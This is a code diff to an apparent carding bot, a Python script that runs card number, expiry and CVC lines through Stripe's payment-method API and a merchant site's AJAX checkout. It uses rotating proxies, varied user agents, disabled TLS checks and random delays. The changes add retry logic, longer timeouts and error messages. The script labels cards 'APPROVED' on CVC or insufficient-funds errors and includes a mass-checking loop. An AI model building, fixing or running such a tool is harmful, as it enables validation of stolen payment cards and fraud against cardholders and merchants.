@@ -27,6 +27,10 @@ sid = '5e112444-6f7d-4ebf-9307-7e4ec16dc6be3601bf'
 # User agent - YOUR ORIGINAL
 us = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
 
+# Increased timeout for slow server
+SITE_TIMEOUT = 60  # Increased from 30 to 60 seconds for slow responses
+STRIPE_TIMEOUT = 45  # Keep Stripe timeout a bit shorter
+
 def get_rotating_user_agent():
     """Generate different types of user agents"""
     agents = [
@@ -67,24 +71,38 @@ def parse_proxy(proxy_str):
     except:
         return None
 
-def requests_retry_session(
+def requests_retry_session_slow(
     retries=3,
-    backoff_factor=0.3,
-    status_forcelist=(500, 502, 504),
+    backoff_factor=2,  # Increased backoff for slow server
+    status_forcelist=(500, 502, 503, 504),
     session=None,
+    timeout=SITE_TIMEOUT
 ):
-    """Create a requests session with retry logic"""
+    """Create a requests session with retry logic optimized for slow servers"""
     session = session or requests.Session()
-    retry = Retry(
-        total=retries,
-        read=retries,
-        connect=retries,
-        backoff_factor=backoff_factor,
-        status_forcelist=status_forcelist,
+    
+    # Increase pool connections for better performance
+    adapter = HTTPAdapter(
+        pool_connections=50,
+        pool_maxsize=50,
+        max_retries=Retry(
+            total=retries,
+            read=retries,
+            connect=retries,
+            backoff_factor=backoff_factor,
+            status_forcelist=status_forcelist,
+            respect_retry_after_header=True  # Respect server's retry-after header
+        )
     )
-    adapter = HTTPAdapter(max_retries=retry)
+    
     session.mount('http://', adapter)
     session.mount('https://', adapter)
+    
+    # Set default timeout
+    session.request = lambda method, url, **kwargs: requests.Session.request(
+        session, method, url, timeout=timeout, **kwargs
+    )
+    
     return session
 
 def get_random_proxy():
@@ -230,7 +248,7 @@ def extract_error_from_response(response_text):
                     else:
                         return str(error_msg)
                 
-                if 'data' in data and isinstance(data['data'], dict and 'error' in data['data']):
+                if 'data' in data and isinstance(data['data'], dict) and 'error' in data['data']:
                     error_data = data['data']['error']
                     if isinstance(error_data, dict) and 'message' in error_data:
                         return str(error_data['message'])
@@ -401,35 +419,39 @@ def test_charge(cc_line):
         # Get proxy
         proxy_dict = get_random_proxy()
         
-        # Make Stripe API request with retry logic
+        # Make Stripe API request with retry logic optimized for slow responses
         max_retries = 3
+        stripe_response = None
+        
         for retry_count in range(max_retries):
             try:
                 # Create session with retry logic
-                session = requests_retry_session(retries=2, backoff_factor=0.5)
+                session = requests_retry_session_slow(retries=2, backoff_factor=0.5, timeout=STRIPE_TIMEOUT)
                 
                 if proxy_dict:
-                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
+                    stripe_response = session.post('https://api.stripe.com/v1/payment_methods', 
                                                   headers=headers_stripe, 
                                                   data=data_stripe,
                                                   proxies=proxy_dict,
-                                                  timeout=30,
                                                   verify=False)
                 else:
-                    response_stripe = session.post('https://api.stripe.com/v1/payment_methods', 
+                    stripe_response = session.post('https://api.stripe.com/v1/payment_methods', 
                                                   headers=headers_stripe, 
                                                   data=data_stripe,
-                                                  timeout=30,
                                                   verify=False)
-                break  # Success, break out of retry loop
                 
+                # If we get a response, break out of retry loop
+                if stripe_response is not None:
+                    break
+                    
             except (requests.exceptions.SSLError, 
                     requests.exceptions.ConnectionError,
                     requests.exceptions.Timeout,
                     requests.exceptions.RequestException) as e:
                 
                 if retry_count < max_retries - 1:
-                    time.sleep(2 ** retry_count)  # Exponential backoff
+                    wait_time = 2 ** retry_count + random.uniform(0.5, 1.5)
+                    time.sleep(wait_time)
                     continue
                 else:
                     # All retries failed
@@ -439,6 +461,8 @@ def test_charge(cc_line):
                     # Handle specific SSL error
                     if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                         error_msg = "SSL Connection Error - Proxy/Network Issue"
+                    elif "Read timed out" in error_msg:
+                        error_msg = "Server took too long to respond (timeout)"
                     
                     return f"""
 ❌ CONNECTION ERROR
@@ -457,12 +481,30 @@ def test_charge(cc_line):
         
         elapsed_time = time.time() - start_time
         
+        # Check if we got a response
+        if stripe_response is None:
+            error_msg = "No response from Stripe after multiple retries"
+            return f"""
+❌ STRIPE ERROR
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        
         # Get Stripe response text
-        stripe_response_text = response_stripe.text if hasattr(response_stripe, 'text') else ""
-        stripe_status = response_stripe.status_code
+        stripe_response_text = stripe_response.text if hasattr(stripe_response, 'text') else ""
+        stripe_status = stripe_response.status_code
         
         if stripe_status != 200:
-            error_msg = get_final_message(stripe_response_text, response_stripe)
+            error_msg = get_final_message(stripe_response_text, stripe_response)
             
             # Check for APPROVED responses (CVC incorrect or insufficient funds)
             if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
@@ -514,7 +556,7 @@ def test_charge(cc_line):
         
         # Try to parse Stripe JSON response
         try:
-            stripe_json = response_stripe.json()
+            stripe_json = stripe_response.json()
             
             if 'error' in stripe_json:
                 error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
@@ -645,48 +687,64 @@ def test_charge(cc_line):
 
         time.sleep(random.uniform(1, 2))
         
-        # Make final AJAX request with retry logic
+        # Make final AJAX request with retry logic optimized for slow server
+        ajax_response = None
         for retry_count in range(max_retries):
             try:
-                # Create session with retry logic for AJAX request
-                ajax_session = requests_retry_session(retries=2, backoff_factor=0.5)
+                # Create session with retry logic for AJAX request with longer timeout
+                ajax_session = requests_retry_session_slow(retries=2, backoff_factor=2, timeout=SITE_TIMEOUT)
+                
+                print(f"Attempting AJAX request (attempt {retry_count + 1})...")
                 
                 if proxy_dict:
-                    response_ajax = ajax_session.post(
+                    ajax_response = ajax_session.post(
                         aj,
                         params=params_ajax,
                         cookies=cookies_ajax,
                         headers=headers_ajax,
                         data=data_ajax,
                         proxies=proxy_dict,
-                        timeout=30,
                         verify=False
                     )
                 else:
-                    response_ajax = ajax_session.post(
+                    ajax_response = ajax_session.post(
                         aj,
                         params=params_ajax,
                         cookies=cookies_ajax,
                         headers=headers_ajax,
                         data=data_ajax,
-                        timeout=30,
                         verify=False
                     )
-                break  # Success, break out of retry loop
                 
+                # If we got a response, break
+                if ajax_response is not None:
+                    print(f"AJAX response received (status: {ajax_response.status_code})")
+                    break
+                    
             except (requests.exceptions.SSLError, 
                     requests.exceptions.ConnectionError,
                     requests.exceptions.Timeout,
                     requests.exceptions.RequestException) as e:
                 
+                print(f"AJAX attempt {retry_count + 1} failed: {str(e)}")
+                
                 if retry_count < max_retries - 1:
-                    time.sleep(2 ** retry_count)  # Exponential backoff
+                    # Wait longer between retries for slow server
+                    wait_time = (2 ** retry_count) * 2 + random.uniform(1, 3)
+                    print(f"Waiting {wait_time:.2f} seconds before retry...")
+                    time.sleep(wait_time)
                     continue
                 else:
                     # All retries failed
+                    elapsed_time = time.time() - start_time
                     error_msg = str(e)
-                    if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
+                    
+                    if "Read timed out" in error_msg:
+                        error_msg = "Website took too long to respond - Server is slow"
+                    elif "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                         error_msg = "SSL Connection Error - Proxy/Network Issue"
+                    elif "Connection aborted" in error_msg:
+                        error_msg = "Connection aborted by server"
                     
                     return f"""
 ❌ AJAX CONNECTION ERROR
@@ -703,12 +761,30 @@ def test_charge(cc_line):
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
         
+        # Check if we got an AJAX response
+        if ajax_response is None:
+            elapsed_time = time.time() - start_time
+            return f"""
+❌ AJAX NO RESPONSE
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No response from website after multiple attempts
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+        
         # Get AJAX response
-        ajax_response_text = response_ajax.text if hasattr(response_ajax, 'text') else ""
-        ajax_status = response_ajax.status_code
+        ajax_response_text = ajax_response.text if hasattr(ajax_response, 'text') else ""
+        ajax_status = ajax_response.status_code
         
         # Get final message
-        final_message = get_final_message(ajax_response_text, response_ajax)
+        final_message = get_final_message(ajax_response_text, ajax_response)
         elapsed_time = time.time() - start_time
         
         # Clean up the final message
@@ -866,7 +942,7 @@ def check_mass_cc(cc_lines):
             result = test_charge(cc_line.strip())
             results.append(result)
             # Add delay between requests
-            time.sleep(random.uniform(1, 2))
+            time.sleep(random.uniform(2, 3))  # Increased delay for slow server
         except Exception as e:
             results.append(f"❌ Error processing card: {str(e)}")
     
